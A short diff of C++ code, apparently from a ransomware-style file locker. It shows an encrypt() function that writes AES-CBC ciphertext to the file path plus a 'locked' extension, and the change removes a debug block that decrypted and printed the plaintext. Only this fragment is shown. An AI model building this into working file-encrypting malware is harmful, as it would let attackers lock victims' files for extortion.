@@ -81,15 +81,6 @@ void encrypt(const crypt_data* d, string path) {
 	std::ofstream ofile((path + LOCKED_EXTENSION).c_str(), std::ios::binary);
 	ofile.write(cipher.c_str(), cipher.length());
 	ofile.close();
-
-	/*
-	 * Test decrypting to verify it works (does not in decryption module)
-	 */
-	string decrypted;
-	CBC_Mode<AES>::Decryption dk;
-	dk.SetKeyWithIV(d->key, sizeof(d->key), d->iv);
-	StringSource ss(cipher, true, new StreamTransformationFilter(dk, new StringSink(decrypted)));
-	cout << "Plaintext:\t" << decrypted << endl;
 }
 
 crypt_data* generatekey() {
